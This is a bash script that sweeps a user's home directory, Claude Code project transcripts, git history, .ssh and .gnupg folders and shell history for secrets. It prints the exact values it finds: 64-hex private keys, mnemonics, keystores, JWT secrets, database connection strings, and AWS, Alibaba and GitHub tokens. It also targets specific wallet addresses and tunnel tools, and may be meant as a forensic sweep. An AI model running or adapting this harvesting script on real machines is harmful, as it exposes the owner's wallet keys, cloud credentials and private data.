#!/bin/bash
set +e
export LC_ALL=C
H=/home/coder

# ---- pattern sets ----
HIGH='0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|0x[0-9a-fA-F]{64}|-----BEGIN|keystore|cipherparams|scrypt|BIP39|mnemonic'
CONN='JWT_SECRET|DATABASE_URL|postgres://|mysql://|redis://|mongodb://'
ZOOFI='zoofi-index|zoofi|wandfi|wand-index|index[ _-]origin|0xFE18Aa1E'
TUN='cloudflared|rathole|trycloudflare|tunnel|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
CLOUD='AKID[0-9a-zA-Z]{12,}|LTAI[0-9a-zA-Z]{12,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{20,}|dckr_pat_[A-Za-z0-9_-]{10,}'
ALL="$HIGH|$CONN|$ZOOFI|$TUN|$CLOUD"

echo "### INV_TOP"
ls -la "$H" 2>/dev/null
echo "### HOMEDIRS"
ls -la /home 2>/dev/null
echo "### GIT_REPOS"
find "$H" -maxdepth 3 -type d -name .git 2>/dev/null | sed 's#/.git$##' | head -120
echo "### CLAUDE_PROJECTS_SIZE"
du -sh "$H/.claude/projects" 2>/dev/null
echo "### CLAUDE_JSONL_COUNT"
find "$H/.claude/projects" -name '*.jsonl' 2>/dev/null | wc -l
echo "### CLAUDE_PROJECT_SUBDIRS"
du -sh "$H/.claude/projects"/* 2>/dev/null | sort -rh | head -40
echo "### PHASE_INV_DONE"

# ---- Phase 1: name-only matched files over .claude/projects (bounded) ----
echo "### CLAUDE_GREPLIST"
timeout 200 grep -aErl -E "$ALL" "$H/.claude/projects" 2>/dev/null > /tmp/m29456.txt
echo "MATCH_FILE_COUNT $(wc -l < /tmp/m29456.txt)"
# also under /home/stage if present
timeout 60 grep -aErl -E "$ALL" /home/stage/.claude/projects 2>/dev/null >> /tmp/m29456.txt
echo "MATCH_FILE_COUNT_TOTAL $(wc -l < /tmp/m29456.txt)"
echo "--- matched files with size/mtime (recent first) ---"
while IFS= read -r f; do
  [ -f "$f" ] || continue
  printf '%s %s %s\n' "$(stat -c %Y "$f" 2>/dev/null)" "$(stat -c %s "$f" 2>/dev/null)" "$f"
done < /tmp/m29456.txt | sort -rn | head -60
echo "### PHASE_LIST_DONE"

# ---- Phase 2: exact high-value string extraction from matched files (recent first, capped) ----
echo "### EXTRACT_HIGH"
i=0; LINES=0
while IFS= read -r row; do
  f=$(echo "$row" | awk '{print $3}')
  [ -f "$f" ] || continue
  [ $i -ge 45 ] && { echo "...cap45..."; break; }
  [ $LINES -ge 500 ] && { echo "...cap500lines..."; break; }
  hits=$(grep -aoE "$HIGH" "$f" 2>/dev/null | sort -u | head -12)
  if [ -n "$hits" ]; then
    echo "@@FILE $f"
    echo "$hits"
    LINES=$((LINES+$(echo "$hits" | wc -l)))
  fi
  i=$((i+1))
done < <(while IFS= read -r f; do [ -f "$f" ] && printf '%s %s %s\n' "$(stat -c %Y "$f" 2>/dev/null)" "$(stat -c %s "$f" 2>/dev/null)" "$f"; done < /tmp/m29456.txt | sort -rn)
echo "### PHASE_EXTRACT_DONE"

# ---- Phase 2b: exact CONN/ZOOFI/CLOUD values (dedup across matched files) ----
echo "### EXTRACT_CONN_ZOOFI_CLOUD"
files=$(head -60 /tmp/m29456.txt)
if [ -n "$files" ]; then
  echo "--- JWT_SECRET assignments ---"
  echo "$files" | while IFS= read -r f; do [ -f "$f" ] && grep -aoE 'JWT_SECRET[^ "]{0,3}[=:][^ "\\]{6,}' "$f" 2>/dev/null; done | sort -u | head -20
  echo "--- DSN values ---"
  echo "$files" | while IFS= read -r f; do [ -f "$f" ] && grep -aoE '(postgres|mysql|mongodb|redis)://[^ "\\]{4,}' "$f" 2>/dev/null; done | sort -u | head -30
  echo "--- zoofi/wand context ---"
  echo "$files" | while IFS= read -r f; do [ -f "$f" ] && grep -aoE '.{0,40}(zoofi|wandfi|wand-index).{0,40}' "$f" 2>/dev/null; done | sort -u | head -40
  echo "--- cloud keys ---"
  echo "$files" | while IFS= read -r f; do [ -f "$f" ] && grep -aoE "$CLOUD" "$f" 2>/dev/null; done | sort -u | head -30
  echo "--- 0x64 candidates (dedup) ---"
  echo "$files" | while IFS= read -r f; do [ -f "$f" ] && grep -aoE '0x[0-9a-fA-F]{64}' "$f" 2>/dev/null; done | sort -u | head -40
fi
echo "### PHASE_EXTRACT2_DONE"

# ---- Phase 3: git repos grep (working tree + history) ----
echo "### GITREPO_SCAN"
for gd in $(find "$H" -maxdepth 3 -type d -name .git 2>/dev/null | head -60); do
  repo=${gd%/.git}
  echo "@@REPO $repo"
  echo "  remote: $(git -C "$repo" remote -v 2>/dev/null | head -2 | tr '\n' ' ')"
  echo "  treehit: $(timeout 25 grep -aErl -E "$ALL" "$repo" --exclude-dir=.git 2>/dev/null | head -15 | tr '\n' ' ')"
  echo "  histhit:"
  timeout 30 git -C "$repo" log --all -p 2>/dev/null | grep -aoE "$HIGH|$CLOUD|$CONN" 2>/dev/null | sort -u | head -10 | sed 's/^/    /'
done
echo "### PHASE_GIT_DONE"

# ---- Phase 4: misc home files ----
echo "### GNUPG"
ls -la "$H/.gnupg" 2>/dev/null
echo "--- private-keys-v1.d ---"
ls -la "$H/.gnupg/private-keys-v1.d" 2>/dev/null
echo "### GSTACK"
find "$H/.gstack" -maxdepth 2 2>/dev/null | head -50
echo "--- gstack grep ---"
timeout 30 grep -aErl -E "$ALL" "$H/.gstack" 2>/dev/null | head -20
echo "### DOCUMENTS"
ls -la "$H/Documents" 2>/dev/null; find "$H/Documents" -maxdepth 2 2>/dev/null | head -50
echo "### BASH_HISTORY"
head -120 "$H/.bash_history" 2>/dev/null
echo "### SSHDIR"
ls -la "$H/.ssh" 2>/dev/null
echo "### CONFIGTOML_LIST"
find "$H/.lumii" -name config.toml 2>/dev/null
echo "### AUTHORIZED_KEYS_BAK"
for b in "$H/.ssh/authorized_keys.bak" "$H/.ssh/authorized_keys.old" "$H/.ssh/authorized_keys2.bak"; do [ -f "$b" ] && { echo "== $b =="; cut -c1-160 "$b"; }; done
echo "### PHASE_MISC_DONE"

# ---- Phase 5: known_hosts (for local hash resolution) ----
echo "### KNOWN_HOSTS_BEGIN"
cat "$H/.ssh/known_hosts" 2>/dev/null
echo "### KNOWN_HOSTS_END"
echo "### KNOWN_HOSTS_OLD_BEGIN"
cat "$H/.ssh/known_hosts.old" 2>/dev/null
echo "### KNOWN_HOSTS_OLD_END"
echo "### ALLDONE"
